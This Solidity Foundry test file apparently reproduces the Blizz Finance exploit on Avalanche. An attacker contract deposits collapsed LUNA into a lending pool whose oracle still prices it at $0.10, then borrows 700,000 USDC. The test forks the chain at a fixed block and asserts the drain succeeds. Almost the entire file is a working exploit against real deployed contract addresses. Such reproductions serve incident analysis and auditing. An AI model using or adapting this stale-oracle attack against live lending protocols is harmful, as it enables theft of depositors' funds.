// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.15;

import "forge-std/Test.sol";
import "../interface.sol";

interface IBlizzLendingPool {
    function deposit(address asset, uint256 amount, address onBehalfOf, uint16 referralCode) external;
    function borrow(
        address asset,
        uint256 amount,
        uint256 interestRateMode,
        uint16 referralCode,
        address onBehalfOf
    ) external;
}

interface IBlizzOracle {
    function getAssetPrice(
        address asset
    ) external view returns (uint256);
}

contract BlizzAttacker {
    IERC20 private constant LUNA = IERC20(0x120AD3e5A7c796349e591F1570D9f7980F4eA9cb);
    IERC20 private constant USDC = IERC20(0xA7D7079b0FEaD91F3e65f86E8915Cb59c1a4C664);
    IBlizzLendingPool private constant POOL = IBlizzLendingPool(0x70BbE4A294878a14CB3CDD9315f5EB490e346163);

    function attack() external {
        uint256 lunaBalance = LUNA.balanceOf(address(this));
        LUNA.approve(address(POOL), lunaBalance);
        POOL.deposit(address(LUNA), lunaBalance, address(this), 0);

        // The feed was stuck at $0.10 while LUNA traded for a fraction of a cent.
        POOL.borrow(address(USDC), 700_000e6, 2, 0, address(this));
    }
}

contract BlizzFinanceExploitTest is Test {
    IERC20 private constant LUNA = IERC20(0x120AD3e5A7c796349e591F1570D9f7980F4eA9cb);
    IERC20 private constant USDC = IERC20(0xA7D7079b0FEaD91F3e65f86E8915Cb59c1a4C664);
    IBlizzOracle private constant ORACLE = IBlizzOracle(0x89Fc4FA08B5fcB8Fa9538d6CC25B638370Fc26d8);

    function testExploit() public {
        vm.createSelectFork("https://api.avax.network/ext/bc/C/rpc", 14_613_676);
        BlizzAttacker attacker = new BlizzAttacker();

        // Represents LUNA bought on the open market after its collapse.
        deal(address(LUNA), address(attacker), 20_000_000 ether);
        assertGt(ORACLE.getAssetPrice(address(LUNA)), 1e15);

        attacker.attack();

        assertEq(USDC.balanceOf(address(attacker)), 700_000e6);
    }
}
